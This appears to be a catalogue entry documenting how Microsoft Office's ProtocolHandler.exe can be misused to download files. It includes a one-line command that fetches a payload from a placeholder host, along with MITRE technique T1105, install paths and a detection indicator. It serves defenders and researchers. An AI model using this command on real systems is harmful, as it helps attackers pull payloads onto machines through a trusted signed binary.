---
Name: ProtocolHandler.exe
Description: Microsoft Office binary
Author: Nir Chako
Created: 2022-07-24
Commands:
  - Command: ProtocolHandler.exe https://example.com/payload
    Description: Downloads payload from remote server
    Usecase: It will download a remote payload and place it in the cache folder (for example - %LOCALAPPDATA%\Microsoft\Windows\INetCache\IE)
    Category: Download
    Privileges: User
    MitreID: T1105
    OperatingSystem: Windows 10, Windows 11
Full_Path:
  - Path: C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\ProtocolHandler.exe
  - Path: C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\ProtocolHandler.exe
  - Path: C:\Program Files (x86)\Microsoft Office\Office16\ProtocolHandler.exe
  - Path: C:\Program Files\Microsoft Office\Office16\ProtocolHandler.exe
  - Path: C:\Program Files (x86)\Microsoft Office 15\ClientX86\Root\Office15\ProtocolHandler.exe
  - Path: C:\Program Files\Microsoft Office 15\ClientX64\Root\Office15\ProtocolHandler.exe
  - Path: C:\Program Files (x86)\Microsoft Office\Office15\ProtocolHandler.exe
  - Path: C:\Program Files\Microsoft Office\Office15\ProtocolHandler.exe
Detection:
  - IOC: Suspicious Office application Internet/network traffic
Acknowledgement:
  - Person: Nir Chako (Pentera)
    Handle: '@C_h4ck_0'
---
